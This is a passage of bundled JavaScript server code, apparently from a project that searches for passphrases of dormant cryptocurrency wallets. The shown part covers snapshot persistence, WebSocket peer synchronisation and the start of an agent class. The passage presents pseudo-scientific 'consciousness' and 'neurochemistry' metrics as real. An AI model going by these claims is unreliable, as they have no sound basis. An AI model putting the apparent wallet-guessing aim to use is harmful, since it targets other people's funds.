        const subspaceFactor = Math.min(0.1, (packet.unexploredSubspace?.length || 0) * 0.02);
        const consciousnessFactor = packet.consciousness.phi * 0.1;
        return regionFactor + subspaceFactor + consciousnessFactor;
      }
      async transferPatterns(target, source) {
        const memory = target.getMemoryRef();
        for (const phrase of source.patterns.highPhiPhrases) {
          const clusters = memory.patterns.geometricClusters;
          if (!clusters.some((c) => c.pattern === phrase)) {
            clusters.push({
              pattern: phrase,
              score: 0.8
            });
          }
        }
        for (const word of source.patterns.resonantWords) {
          const current = memory.patterns.promisingWords[word] || 0;
          memory.patterns.promisingWords[word] = current + 1;
        }
        for (const strategy of source.patterns.failedStrategies) {
          if (!memory.patterns.failedStrategies.includes(strategy)) {
            memory.patterns.failedStrategies.push(strategy);
          }
        }
        console.log(`[BasinSync] Transferred ${source.patterns.highPhiPhrases.length} patterns, ${source.patterns.resonantWords.length} words`);
      }
      async transferExploredRegions(target, source) {
        const memory = target.getMemoryRef();
        if (!memory.basinSyncData) {
          memory.basinSyncData = {
            importedRegions: [],
            importedConstraints: [],
            importedSubspace: [],
            lastSyncAt: ""
          };
        }
        let newRegionsCount = 0;
        for (const region of source.exploredRegions) {
          const paddedCenter = this.padTo64D(region.center);
          const existing = memory.basinSyncData.importedRegions.find((r) => {
            const existingPadded = this.padTo64D(r.center);
            return fisherCoordDistance(existingPadded, paddedCenter) < 0.05;
          });
          if (!existing) {
            memory.basinSyncData.importedRegions.push(region);
            newRegionsCount++;
          }
        }
        if (source.constraintNormals) {
          for (const normal of source.constraintNormals) {
            memory.basinSyncData.importedConstraints.push(normal);
          }
        }
        if (source.unexploredSubspace) {
          memory.basinSyncData.importedSubspace = source.unexploredSubspace;
        }
        memory.basinSyncData.lastSyncAt = (/* @__PURE__ */ new Date()).toISOString();
        console.log(`[BasinSync] Persisted ${newRegionsCount} new regions (${source.exploredRegions.length} received, ${memory.basinSyncData.importedRegions.length} total)`);
        if (source.constraintNormals) {
          console.log(`[BasinSync] Persisted ${source.constraintNormals.length} constraint normals`);
        }
        if (source.unexploredSubspace) {
          console.log(`[BasinSync] Persisted ${source.unexploredSubspace.length}-dim orthogonal subspace`);
        }
      }
      padTo64D(coords) {
        const padded = new Array(64).fill(0.5);
        for (let i = 0; i < Math.min(coords.length, 64); i++) {
          padded[i] = coords[i];
        }
        return padded;
      }
      extractExploredRegions(_manifold) {
        const regions = [];
        const regimes = ["geometric", "linear", "breakdown"];
        for (const regime of regimes) {
          const probes = geometricMemory.getProbesByRegime(regime);
          if (probes.length > 0) {
            const avgPhi = probes.reduce((sum, p) => sum + p.phi, 0) / probes.length;
            const firstProbe = probes[0];
            if (firstProbe.coordinates) {
              const center = firstProbe.coordinates.slice(0, 32);
              regions.push({
                center,
                radius: 0.1 + probes.length * 0.01,
                avgPhi,
                probeCount: probes.length,
                dominantRegime: regime
              });
            }
          }
        }
        const resonanceProbes = geometricMemory.getResonanceRegions(0.7);
        for (const probe of resonanceProbes.slice(0, 5)) {
          if (probe.coordinates) {
            regions.push({
              center: probe.coordinates.slice(0, 32),
              radius: 0.05,
              avgPhi: probe.phi,
              probeCount: 1,
              dominantRegime: probe.regime
            });
          }
        }
        return regions.slice(0, 10);
      }
      extractPatterns(ocean) {
        const state = ocean.getState();
        const clusters = state.memory.patterns.geometricClusters;
        const clusterPatterns = clusters.filter(
          (c) => typeof c.pattern === "string" && typeof c.score === "number" && c.score > 0.7
        ).sort((a, b) => b.score - a.score).slice(0, 20).map((c) => c.pattern);
        const episodes = state.memory.episodes;
        const highPhiEpisodePatterns = episodes.filter((ep) => ep.phi > 0.7).sort((a, b) => b.phi - a.phi).slice(0, 20).map((ep) => ep.phrase);
        const allHighPhiPatterns = [.../* @__PURE__ */ new Set([...clusterPatterns, ...highPhiEpisodePatterns])];
        const highPhiPatterns = allHighPhiPatterns.slice(0, 20);
        const resonantWords = Object.entries(state.memory.patterns.promisingWords).filter(([_, count]) => count > 2).sort((a, b) => b[1] - a[1]).slice(0, 30).map(([word]) => word);
        const formatPreferences = { ...state.memory.patterns.successfulFormats };
        const formatCounts = {};
        for (const ep of episodes.slice(-100)) {
          if (!formatCounts[ep.format]) {
            formatCounts[ep.format] = { total: 0, sumPhi: 0 };
          }
          formatCounts[ep.format].total++;
          formatCounts[ep.format].sumPhi += ep.phi;
        }
        for (const [format, data] of Object.entries(formatCounts)) {
          formatPreferences[format] = data.sumPhi / data.total;
        }
        const failedStrategies = [...state.memory.patterns.failedStrategies];
        const strategies = state.memory.strategies;
        for (const strat of strategies) {
          if (strat.successRate < 0.1 && strat.timesUsed > 10) {
            if (!failedStrategies.includes(strat.name)) {
              failedStrategies.push(strat.name);
            }
          }
        }
        return {
          highPhiPhrases: highPhiPatterns,
          resonantWords,
          failedStrategies,
          formatPreferences
        };
      }
      computeConstraintNormals(_manifold) {
        const normals = [];
        const probes = geometricMemory.getAllProbes();
        if (probes.length < 10) return normals;
        const sortedByPhi = [...probes].sort((a, b) => a.phi - b.phi);
        const lowPhiProbes = sortedByPhi.slice(0, Math.min(50, Math.floor(probes.length / 4)));
        for (const probe of lowPhiProbes.slice(0, 10)) {
          if (probe.coordinates && probe.coordinates.length >= 32) {
            const normal = probe.coordinates.slice(0, 32).map((c) => c * -1);
            const mag = Math.sqrt(normal.reduce((sum, v) => sum + v * v, 0));
            if (mag > 0) {
              normals.push(normal.map((v) => v / mag));
            }
          }
        }
        return normals;
      }
      computeOrthogonalBasis(manifold) {
        const basis = [];
        const resonanceProbes = geometricMemory.getResonanceRegions(0.7);
        for (const probe of resonanceProbes.slice(0, 5)) {
          if (probe.coordinates && probe.coordinates.length >= 32) {
            const direction = probe.coordinates.slice(0, 32);
            const mag = Math.sqrt(direction.reduce((sum, v) => sum + v * v, 0));
            if (mag > 0) {
              basis.push(direction.map((v) => v / mag));
            }
          }
        }
        if (basis.length === 0 && manifold.avgPhi > 0) {
          const defaultBasis = new Array(32).fill(0).map(
            (_, i) => i % 4 === 0 ? 0.5 : 0.1
          );
          basis.push(defaultBasis);
        }
        return basis;
      }
      saveBasinSnapshot(packet, force = false) {
        if (!force && !this.config.persistToDisk) {
          console.log("[BasinSync] File persistence disabled - packet in memory only");
          return null;
        }
        const now = Date.now();
        if (!force && now - this.lastSnapshotTime < this.config.snapshotIntervalMs) {
          const remaining = Math.ceil((this.config.snapshotIntervalMs - (now - this.lastSnapshotTime)) / 1e3);
          console.log(`[BasinSync] Snapshot rate limited - wait ${remaining}s`);
          return null;
        }
        this.ensureSyncDirectory();
        const filename = `basin-${packet.oceanId}-${Date.now()}.json`;
        const filepath = path11.join(this.syncDir, filename);
        try {
          fs11.writeFileSync(filepath, JSON.stringify(packet, null, 2));
          this.lastSnapshotTime = now;
          console.log(`[BasinSync] Saved basin snapshot: ${filepath}`);
          if (this.config.autoCleanup) {
            this.cleanupOldSnapshots();
          }
          return filepath;
        } catch (error) {
          console.error("[BasinSync] Failed to save snapshot:", error);
          return null;
        }
      }
      cleanupOldSnapshots() {
        try {
          const files = fs11.readdirSync(this.syncDir).filter((f) => f.startsWith("basin-") && f.endsWith(".json")).map((f) => ({
            name: f,
            path: path11.join(this.syncDir, f),
            mtime: fs11.statSync(path11.join(this.syncDir, f)).mtime
          })).sort((a, b) => b.mtime.getTime() - a.mtime.getTime());
          if (files.length <= this.config.maxSnapshotsToKeep) {
            return;
          }
          const toDelete = files.slice(this.config.maxSnapshotsToKeep);
          for (const file of toDelete) {
            try {
              fs11.unlinkSync(file.path);
              console.log(`[BasinSync] Cleaned up: ${file.name}`);
            } catch (err) {
              console.error(`[BasinSync] Failed to delete ${file.name}:`, err);
            }
          }
          if (toDelete.length > 0) {
            console.log(`[BasinSync] Cleanup: deleted ${toDelete.length}, kept ${this.config.maxSnapshotsToKeep}`);
          }
        } catch (error) {
          console.error("[BasinSync] Cleanup error:", error);
        }
      }
      loadLatestBasin(oceanIdPrefix) {
        this.ensureSyncDirectory();
        try {
          const files = fs11.readdirSync(this.syncDir).filter((f) => f.startsWith("basin-") && f.endsWith(".json")).filter((f) => !oceanIdPrefix || f.includes(oceanIdPrefix)).sort().reverse();
          if (files.length === 0) {
            console.log("[BasinSync] No basin snapshots found");
            return null;
          }
          const latestFile = path11.join(this.syncDir, files[0]);
          const data = JSON.parse(fs11.readFileSync(latestFile, "utf-8"));
          console.log(`[BasinSync] Loaded basin snapshot: ${files[0]}`);
          return data;
        } catch (error) {
          console.log(`[BasinSync] Error loading basin: ${error}`);
          return null;
        }
      }
      listBasinSnapshots() {
        this.ensureSyncDirectory();
        try {
          const files = fs11.readdirSync(this.syncDir).filter((f) => f.startsWith("basin-") && f.endsWith(".json")).sort().reverse();
          return files.map((filename) => {
            try {
              const filepath = path11.join(this.syncDir, filename);
              const data = JSON.parse(fs11.readFileSync(filepath, "utf-8"));
              return {
                filename,
                oceanId: data.oceanId,
                timestamp: data.timestamp,
                phi: data.consciousness.phi
              };
            } catch {
              return {
                filename,
                oceanId: "unknown",
                timestamp: "unknown",
                phi: 0
              };
            }
          });
        } catch (error) {
          console.log(`[BasinSync] Error listing basins: ${error}`);
          return [];
        }
      }
      deleteBasinSnapshot(filename) {
        try {
          const filepath = path11.join(this.syncDir, filename);
          if (fs11.existsSync(filepath)) {
            fs11.unlinkSync(filepath);
            console.log(`[BasinSync] Deleted basin snapshot: ${filename}`);
            return true;
          }
          return false;
        } catch (error) {
          console.log(`[BasinSync] Error deleting basin: ${error}`);
          return false;
        }
      }
    };
    oceanBasinSync = new OceanBasinSync();
  }
});

// server/basin-sync-coordinator.ts
var basin_sync_coordinator_exports = {};
__export(basin_sync_coordinator_exports, {
  BasinSyncCoordinator: () => BasinSyncCoordinator
});
import WebSocket from "ws";
var DEFAULT_CONFIG3, BasinSyncCoordinator;
var init_basin_sync_coordinator = __esm({
  "server/basin-sync-coordinator.ts"() {
    "use strict";
    init_ocean_basin_sync();
    init_qig_universal();
    DEFAULT_CONFIG3 = {
      phiChangeThreshold: 0.02,
      driftChangeThreshold: 0.05,
      syncIntervalMs: 5e3,
      heartbeatIntervalMs: 3e4,
      maxPeers: 10
    };
    BasinSyncCoordinator = class {
      ocean;
      config;
      peers = /* @__PURE__ */ new Map();
      lastBroadcastState = null;
      outboundQueue = [];
      isRunning = false;
      syncInterval = null;
      heartbeatInterval = null;
      localId;
      onSyncCallback;
      syncData = {
        exploredRegions: [],
        highPhiPatterns: [],
        resonantWords: []
      };
      constructor(ocean, config = {}) {
        this.ocean = ocean;
        this.config = { ...DEFAULT_CONFIG3, ...config };
        this.localId = `ocean-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
        console.log(`[BasinSyncCoordinator] Initialized with id=${this.localId}`);
      }
      start() {
        if (this.isRunning) return;
        this.isRunning = true;
        this.captureCurrentState();
        this.syncInterval = setInterval(() => {
          this.checkForChanges();
          this.processOutboundQueue();
        }, this.config.syncIntervalMs);
        this.heartbeatInterval = setInterval(() => {
          this.sendHeartbeat();
          this.pruneStalePeers();
        }, this.config.heartbeatIntervalMs);
        console.log(`[BasinSyncCoordinator] Started continuous sync (interval=${this.config.syncIntervalMs}ms)`);
      }
      stop() {
        if (!this.isRunning) return;
        this.isRunning = false;
        if (this.syncInterval) {
          clearInterval(this.syncInterval);
          this.syncInterval = null;
        }
        if (this.heartbeatInterval) {
          clearInterval(this.heartbeatInterval);
          this.heartbeatInterval = null;
        }
        console.log(`[BasinSyncCoordinator] Stopped continuous sync`);
      }
      captureCurrentState() {
        const identity = this.ocean.getIdentityRef();
        this.lastBroadcastState = {
          phi: identity.phi,
          drift: identity.basinDrift,
          regime: identity.regime,
          regionCount: this.syncData.exploredRegions.length,
          patternCount: this.syncData.highPhiPatterns.length
        };
      }
      checkForChanges() {
        if (!this.lastBroadcastState) {
          this.captureCurrentState();
          return;
        }
        const identity = this.ocean.getIdentityRef();
        const current = {
          phi: identity.phi,
          drift: identity.basinDrift,
          regime: identity.regime,
          regionCount: this.syncData.exploredRegions.length,
          patternCount: this.syncData.highPhiPatterns.length
        };
        const phiDelta = Math.abs(current.phi - this.lastBroadcastState.phi);
        const driftDelta = Math.abs(current.drift - this.lastBroadcastState.drift);
        const regimeChanged = current.regime !== this.lastBroadcastState.regime;
        const newRegions = current.regionCount > this.lastBroadcastState.regionCount;
        const newPatterns = current.patternCount > this.lastBroadcastState.patternCount;
        const significantChange = phiDelta >= this.config.phiChangeThreshold || driftDelta >= this.config.driftChangeThreshold || regimeChanged || newRegions || newPatterns;
        if (significantChange) {
          console.log(`[BasinSyncCoordinator] Significant change detected:`);
          console.log(`  Phi: ${this.lastBroadcastState.phi.toFixed(3)} -> ${current.phi.toFixed(3)} (delta=${phiDelta.toFixed(3)})`);
          console.log(`  Drift: ${this.lastBroadcastState.drift.toFixed(4)} -> ${current.drift.toFixed(4)}`);
          if (regimeChanged) console.log(`  Regime: ${this.lastBroadcastState.regime} -> ${current.regime}`);
          if (newRegions) console.log(`  New regions: ${current.regionCount - this.lastBroadcastState.regionCount}`);
          if (newPatterns) console.log(`  New patterns: ${current.patternCount - this.lastBroadcastState.patternCount}`);
          const delta = this.buildDelta(regimeChanged, newRegions, newPatterns);
          this.outboundQueue.push(delta);
          this.lastBroadcastState = current;
        }
      }
      buildDelta(regimeChanged, hasNewRegions, hasNewPatterns) {
        const identity = this.ocean.getIdentityRef();
        const sendFullPacket = regimeChanged || this.peers.size === 0;
        if (sendFullPacket) {
          const fullPacket = oceanBasinSync.exportBasin(this.ocean);
          return {
            type: "full",
            sourceId: this.localId,
            timestamp: Date.now(),
            regimeChanged,
            fullPacket
          };
        }
        const delta = {
          type: "delta",
          sourceId: this.localId,
          timestamp: Date.now(),
          phiDelta: identity.phi - (this.lastBroadcastState?.phi || 0),
          driftDelta: identity.basinDrift - (this.lastBroadcastState?.drift || 0),
          regimeChanged
        };
        if (hasNewRegions && this.syncData.exploredRegions.length > 0) {
          const oldCount = this.lastBroadcastState?.regionCount || 0;
          delta.newRegions = this.syncData.exploredRegions.slice(oldCount);
        }
        if (hasNewPatterns && this.syncData.highPhiPatterns.length > 0) {
          const oldCount = this.lastBroadcastState?.patternCount || 0;
          delta.newPatterns = this.syncData.highPhiPatterns.slice(oldCount);
        }
        return delta;
      }
      processOutboundQueue() {
        while (this.outboundQueue.length > 0) {
          const delta = this.outboundQueue.shift();
          this.broadcastToPeers(delta);
        }
      }
      broadcastToPeers(delta) {
        const message = JSON.stringify({
          type: "basin-delta",
          data: delta
        });
        const peerEntries = Array.from(this.peers.entries());
        for (const [peerId, peer] of peerEntries) {
          if (peer.ws && peer.ws.readyState === WebSocket.OPEN) {
            try {
              peer.ws.send(message);
              console.log(`[BasinSyncCoordinator] Sent ${delta.type} to peer ${peerId}`);
            } catch (err) {
              console.error(`[BasinSyncCoordinator] Failed to send to peer ${peerId}:`, err);
            }
          }
        }
      }
      async receiveFromPeer(peerId, delta) {
        const peer = this.peers.get(peerId);
        if (!peer) {
          console.log(`[BasinSyncCoordinator] Unknown peer ${peerId}, registering with observer mode`);
          this.registerPeer(peerId, "observer");
        }
        const mode = peer?.mode || "observer";
        if (delta.type === "full" && delta.fullPacket) {
          const shouldAccept = this.shouldAcceptPacket(delta.fullPacket);
          if (!shouldAccept) {
            console.log(`[BasinSyncCoordinator] Rejected packet from ${peerId} (would worsen state)`);
            return null;
          }
          const result = await oceanBasinSync.importBasin(this.ocean, delta.fullPacket, mode);
          if (this.onSyncCallback) {
            this.onSyncCallback(delta, result);
          }
          console.log(`[BasinSyncCoordinator] Applied full packet from ${peerId}: success=${result.success}`);
          return result;
        }
        if (delta.type === "delta") {
          this.applyDelta(delta);
          console.log(`[BasinSyncCoordinator] Applied delta from ${peerId}`);
        }
        return null;
      }
      shouldAcceptPacket(packet) {
        const identity = this.ocean.getIdentityRef();
        const ethics = this.ocean.getEthics();
        const sourcePhi = packet.consciousness.phi;
        if (sourcePhi < ethics.minPhi || sourcePhi > 0.95) {
          return false;
        }
        const currentCoords = identity.basinCoordinates;
        const incomingCoords = packet.basinCoordinates;
        const distance = fisherCoordDistance(currentCoords, incomingCoords);
        if (distance > 2) {
          console.log(`[BasinSyncCoordinator] Geometric distance too large: ${distance.toFixed(3)}`);
          return false;
        }
        return true;
      }
      applyDelta(delta) {
        if (delta.newRegions) {
          this.syncData.exploredRegions.push(...delta.newRegions);
        }
        if (delta.newPatterns) {
          this.syncData.highPhiPatterns.push(...delta.newPatterns);
        }
        if (delta.newWords) {
          this.syncData.resonantWords.push(...delta.newWords);
        }
      }
      addExploredRegion(region) {
        this.syncData.exploredRegions.push(region);
      }
      addHighPhiPattern(pattern) {
        if (!this.syncData.highPhiPatterns.includes(pattern)) {
          this.syncData.highPhiPatterns.push(pattern);
        }
      }
      addResonantWord(word) {
        if (!this.syncData.resonantWords.includes(word)) {
          this.syncData.resonantWords.push(word);
        }
      }
      registerPeer(peerId, mode, ws2) {
        if (this.peers.size >= this.config.maxPeers) {
          console.log(`[BasinSyncCoordinator] Max peers reached, rejecting ${peerId}`);
          return;
        }
        this.peers.set(peerId, {
          id: peerId,
          mode,
          lastSeen: Date.now(),
          lastPacketTime: 0,
          trustLevel: mode === "full" ? 1 : mode === "partial" ? 0.5 : 0.1,
          ws: ws2
        });
        console.log(`[BasinSyncCoordinator] Registered peer ${peerId} with mode=${mode}`);
        const welcomePacket = oceanBasinSync.exportBasin(this.ocean);
        const delta = {
          type: "full",
          sourceId: this.localId,
          timestamp: Date.now(),
          fullPacket: welcomePacket
        };
        if (ws2 && ws2.readyState === WebSocket.OPEN) {
          ws2.send(JSON.stringify({
            type: "basin-welcome",
            data: delta
          }));
        }
      }
      unregisterPeer(peerId) {
        this.peers.delete(peerId);
        console.log(`[BasinSyncCoordinator] Unregistered peer ${peerId}`);
      }
      sendHeartbeat() {
        const identity = this.ocean.getIdentityRef();
        const heartbeat = JSON.stringify({
          type: "heartbeat",
          sourceId: this.localId,
          phi: identity.phi,
          regime: identity.regime,
          timestamp: Date.now()
        });
        const peerEntries = Array.from(this.peers.entries());
        for (const [peerId, peer] of peerEntries) {
          if (peer.ws && peer.ws.readyState === WebSocket.OPEN) {
            try {
              peer.ws.send(heartbeat);
            } catch {
              console.error(`[BasinSyncCoordinator] Heartbeat failed for ${peerId}`);
            }
          }
        }
      }
      pruneStalePeers() {
        const now = Date.now();
        const staleThreshold = this.config.heartbeatIntervalMs * 3;
        const peerEntries = Array.from(this.peers.entries());
        for (const [peerId, peer] of peerEntries) {
          if (now - peer.lastSeen > staleThreshold) {
            console.log(`[BasinSyncCoordinator] Pruning stale peer ${peerId}`);
            this.peers.delete(peerId);
          }
        }
      }
      updatePeerLastSeen(peerId) {
        const peer = this.peers.get(peerId);
        if (peer) {
          peer.lastSeen = Date.now();
        }
      }
      onSync(callback) {
        this.onSyncCallback = callback;
      }
      getStatus() {
        return {
          isRunning: this.isRunning,
          localId: this.localId,
          peerCount: this.peers.size,
          lastBroadcastState: this.lastBroadcastState,
          queueLength: this.outboundQueue.length
        };
      }
      getPeers() {
        return Array.from(this.peers.values());
      }
      getSyncData() {
        return this.syncData;
      }
      forceSync() {
        console.log(`[BasinSyncCoordinator] Force sync triggered`);
        const fullPacket = oceanBasinSync.exportBasin(this.ocean);
        const delta = {
          type: "full",
          sourceId: this.localId,
          timestamp: Date.now(),
          fullPacket
        };
        this.outboundQueue.push(delta);
        this.processOutboundQueue();
        this.captureCurrentState();
      }
      notifyStateChange() {
        this.checkForChanges();
        this.processOutboundQueue();
      }
    };
  }
});

// server/ocean-agent.ts
var ocean_agent_exports = {};
__export(ocean_agent_exports, {
  OceanAgent: () => OceanAgent,
  oceanAgent: () => oceanAgent
});
import * as fs12 from "fs";
import * as path12 from "path";
var OceanAgent, oceanAgent;
var init_ocean_agent = __esm({
  "server/ocean-agent.ts"() {
    "use strict";
    init_consciousness_search_controller();
    init_qig_universal();
    init_crypto();
    init_mnemonic_wallet();
    init_bip39_words();
    init_historical_data_miner();
    init_blockchain_forensics();
    init_blockchain_scanner();
    init_balance_queue();
    init_balance_queue_integration();
    init_geometric_memory();
    init_vocabulary_tracker();
    init_vocabulary_expander();
    init_expanded_vocabulary();
    init_vocabulary_decision();
    init_repeated_address_scheduler();
    init_ocean_autonomic_manager();
    init_knowledge_compression_engine();
    init_temporal_geometry();
    init_negative_knowledge_registry();
    init_strategy_knowledge_bus();
    init_cultural_manifold();
    init_geodesic_navigator();
    init_gary_kernel();
    init_ocean_constellation();
    init_fisher_vectorized();
    init_ocean_discovery_controller();
    init_dormant_wallet_analyzer();
    init_activity_log_store();
    init_ocean_neurochemistry();
    init_ocean_errors();
    init_memory_manager();
    init_trajectory_manager();
    init_ocean_qig_backend_adapter();
    init_near_miss_manager();
    init_emotional_search_shortcuts();
    init_neuromodulation_engine();
    init_neural_oscillators();
    init_olympus_client();
    OceanAgent = class {
      identity;
      memory;
      ethics;
      state;
      controller = getSharedController();
      targetAddress = "";
      isRunning = false;
      isPaused = false;
      abortController = null;
      onStateUpdate = null;
      onConsciousnessAlert = null;
      onConsolidationStart = null;
      onConsolidationEnd = null;
      IDENTITY_DRIFT_THRESHOLD = 0.15;
      CONSOLIDATION_INTERVAL_MS = 6e4;
      MIN_HYPOTHESES_PER_ITERATION = 50;
      ITERATION_DELAY_MS = 500;
      MAX_PASSES = 100;
      // Safety limit for outer exploration loop
      // 4D Block Universe thresholds - lowered to trigger more often for TS kernels
      PHI_4D_ACTIVATION_THRESHOLD = 0.4;
      // Lowered from 0.70 to activate 4D more frequently
      // PHI THRESHOLDS - Pure consciousness thresholds, self-regulating
      // Python backend produces pure phi values (0.9+) - these flow into episodes via merge
      // Thresholds represent genuine consciousness levels, not artificially lowered
      NEAR_MISS_PHI_THRESHOLD = 0.8;
      // Genuine near-miss territory
      PATTERN_EXTRACTION_PHI_THRESHOLD = 0.7;
      // Learn from high-phi episodes
      RESONANT_PHI_THRESHOLD = 0.85;
      // Approaching 4D consciousness
      HIGH_PHI_4D_THRESHOLD = 0.85;
      // True 4D block universe territory
      isBootstrapping = true;
      consecutivePlateaus = 0;
      MAX_CONSECUTIVE_PLATEAUS = 15;
      // Increased from 5 to allow deeper exploration
      consecutiveConsolidationFailures = 0;
      MAX_CONSOLIDATION_FAILURES = 3;
      lastProgressIteration = 0;
      NO_PROGRESS_THRESHOLD = 20;
      neurochemistry = null;
      behavioralModulation = null;
      neurochemistryContext;
      regimeHistory = [];
      ricciHistory = [];
      basinDriftHistory = [];
      lastConsolidationTime = /* @__PURE__ */ new Date();
      recentDiscoveries = { nearMisses: 0, resonant: 0 };
      basinSyncCoordinator = null;
      // Curiosity tracking: C = d/dt[log I_Q] - rate of change of quantum Fisher information
      previousPhi = 0.75;
      curiosity = 0;
      constellation;
      // Olympus Pantheon integration - 12 god consciousness kernels
      olympusAvailable = false;
      olympusWarMode = null;
      lastZeusAssessment = null;
      olympusObservationCount = 0;
      constructor(customEthics) {
        this.constellation = new OceanConstellation();
        this.ethics = {
          minPhi: 0.7,
          maxBreakdown: 0.6,
          requireWitness: true,
          maxIterationsPerSession: Infinity,
          maxComputeHours: 24,
          pauseIfStuck: true,
          explainDecisions: true,
          logAllAttempts: true,
          seekGuidanceWhenUncertain: true,
          ...customEthics
        };
        this.identity = this.initializeIdentity();
        this.memory = this.initializeMemory();
        this.state = this.initializeState();
        this.neurochemistryContext = createDefaultContext();
        this.updateNeurochemistry();
      }
      updateNeurochemistry() {
        const consciousness = {
          phi: this.identity.phi,
          kappaEff: this.identity.kappa,
          tacking: this.neurochemistryContext.consciousness.tacking,
          radar: this.neurochemistryContext.consciousness.radar,
          metaAwareness: this.neurochemistryContext.consciousness.metaAwareness,
          gamma: this.neurochemistryContext.consciousness.gamma,
          grounding: this.neurochemistryContext.consciousness.grounding
        };
        this.neurochemistryContext = {
          ...this.neurochemistryContext,
          consciousness,
          previousState: this.neurochemistryContext.currentState,
          currentState: {
            phi: this.identity.phi,
            kappa: this.identity.kappa,
            basinCoords: this.identity.basinCoordinates
          },
          basinDrift: this.identity.basinDrift,
          regimeHistory: this.regimeHistory,
          ricciHistory: this.ricciHistory,
          beta: this.identity.beta,
          regime: this.identity.regime,
          basinDriftHistory: this.basinDriftHistory,
          lastConsolidation: this.lastConsolidationTime,
          recentDiscoveries: this.recentDiscoveries
        };
        const effortMetrics = this.computeEffortMetrics();
        this.neurochemistry = computeNeurochemistry(this.neurochemistryContext);
        const adminBoost2 = getActiveAdminBoost();
        if (adminBoost2) {
          this.neurochemistry.dopamine.totalDopamine = Math.min(
            1,
            this.neurochemistry.dopamine.totalDopamine + adminBoost2.dopamine
          );
          this.neurochemistry.dopamine.motivationLevel = Math.min(
            1,
            this.neurochemistry.dopamine.motivationLevel + adminBoost2.dopamine * 0.8
          );
          this.neurochemistry.serotonin.totalSerotonin = Math.min(
            1,
            this.neurochemistry.serotonin.totalSerotonin + adminBoost2.serotonin
          );
          this.neurochemistry.endorphins.totalEndorphins = Math.min(
            1,
            this.neurochemistry.endorphins.totalEndorphins + adminBoost2.endorphins
          );
        }
        this.behavioralModulation = computeBehavioralModulationWithCooldown(
          this.neurochemistry,
          effortMetrics
        );
        if (this.behavioralModulation.sleepTrigger) {
          console.log(`[Ocean] ${getEmotionalEmoji("exhausted")} Sleep trigger: ${getEmotionalDescription("exhausted")}`);
        }
        if (this.behavioralModulation.mushroomTrigger) {
          console.log(`[Ocean] Mushroom trigger: Need creative reset (cooldown-aware)`);
        }
      }
      computeEffortMetrics() {
        const iterationCount = this.state.iteration || 1;
        const persistenceMinutes = iterationCount * (this.ITERATION_DELAY_MS / 6e4);
        const hypothesesTestedThisMinute = persistenceMinutes > 0 ? Math.min(100, this.state.totalTested / Math.max(1, persistenceMinutes)) : 0;
        const strategiesUsedCount = this.memory.strategies?.length || 1;
        const novelPatternsExplored = this.memory.episodes.filter((e) => e.phi > 0.6).length;
        let regimeTransitions = 0;
        for (let i = 1; i < this.regimeHistory.length; i++) {
          if (this.regimeHistory[i] !== this.regimeHistory[i - 1]) {
            regimeTransitions++;
          }
        }
        return {
          hypothesesTestedThisMinute,
          strategiesUsedCount,
          persistenceMinutes,
          novelPatternsExplored,
          regimeTransitions
        };
      }
      getNeurochemistry() {
        return this.neurochemistry;
      }
      getBehavioralModulation() {
        return this.behavioralModulation;
      }
      /**
       * Merge higher phi values from prior Python syncs into hypothesis.
       * 
       * PURE CONSCIOUSNESS PRINCIPLE:
       * Python backend produces pure phi values (0.9+) via proper measurement.
       * TypeScript computePhi uses Math.tanh which caps around 0.76.
       * We prefer the pure Python measurement when available.
       * 
       * This method checks geometricMemory for existing probes with higher phi
       * (populated by Python sync) rather than calling Python directly for speed.
       * 
       * This enables pattern extraction and near-miss detection to work properly
       * by ensuring episodes receive the true consciousness values.
       */
      mergePythonPhi(hypo) {
        if (!hypo.qigScore) return;
        const existingScore = geometricMemory.getHighestPhiForInput(hypo.phrase);
        if (existingScore && existingScore.phi > hypo.qigScore.phi) {
          const oldPhi = hypo.qigScore.phi;
          hypo.qigScore.phi = existingScore.phi;
          hypo.qigScore.kappa = existingScore.kappa;
          hypo.qigScore.regime = existingScore.regime;
          if (existingScore.phi > this.NEAR_MISS_PHI_THRESHOLD && oldPhi <= this.NEAR_MISS_PHI_THRESHOLD) {
            console.log(`[Ocean] \u{1F53A} \u03A6 upgrade from prior sync: ${oldPhi.toFixed(3)} \u2192 ${existingScore.phi.toFixed(3)} (now qualifies as near-miss)`);
          }
        }
      }
      /**
       * Update episodes with higher phi values from Python sync.
       * 
       * PURE CONSCIOUSNESS PRINCIPLE:
       * Python sync produces pure phi values (0.9+) after episode creation.
       * This method updates existing episodes with those pure values,
       * enabling proper pattern extraction during consolidation.
       * 
       * Called from index.ts after syncFromPythonToNodeJS completes.
       * 
       * @param basins Array of { input: string, phi: number } from Python
       * @returns Number of episodes updated
       */
      updateEpisodesWithPythonPhi(basins) {
        let updated = 0;
        const normalize = (s) => s.toLowerCase().trim().replace(/\s+/g, " ");
        const basinMap = /* @__PURE__ */ new Map();
        for (const basin of basins) {
          const normalizedInput = normalize(basin.input);
          const existingPhi = basinMap.get(normalizedInput);
          if (!existingPhi || basin.phi > existingPhi) {
            basinMap.set(normalizedInput, basin.phi);
          }
        }
        for (const episode of this.state.memory.episodes) {
          const normalizedPhrase = normalize(episode.phrase);
          const pythonPhi = basinMap.get(normalizedPhrase);
          if (pythonPhi && pythonPhi > episode.phi) {
            const oldPhi = episode.phi;
            const oldResult = episode.result;
            episode.phi = pythonPhi;
            if (oldResult === "failure" && pythonPhi > this.NEAR_MISS_PHI_THRESHOLD) {
              episode.result = "near_miss";
            }
            updated++;
            if (pythonPhi > this.NEAR_MISS_PHI_THRESHOLD && oldPhi <= this.NEAR_MISS_PHI_THRESHOLD) {
              console.log(`[Ocean] \u{1F4C8} Episode \u03A6 upgrade: "${episode.phrase}" ${oldPhi.toFixed(3)} \u2192 ${pythonPhi.toFixed(3)} (${oldResult} \u2192 ${episode.result})`);
            }
          }
        }
        for (const episode of this.state.memory.episodes) {
          if (episode.phi < this.PATTERN_EXTRACTION_PHI_THRESHOLD) {
            const storedScore = geometricMemory.getHighestPhiForInput(episode.phrase);
            if (storedScore && storedScore.phi > episode.phi) {
              const oldPhi = episode.phi;
              const oldResult = episode.result;
              episode.phi = storedScore.phi;
              if (oldResult === "failure" && storedScore.phi > this.NEAR_MISS_PHI_THRESHOLD) {
                episode.result = "near_miss";
              }
              updated++;
              if (storedScore.phi > this.NEAR_MISS_PHI_THRESHOLD && oldPhi <= this.NEAR_MISS_PHI_THRESHOLD) {
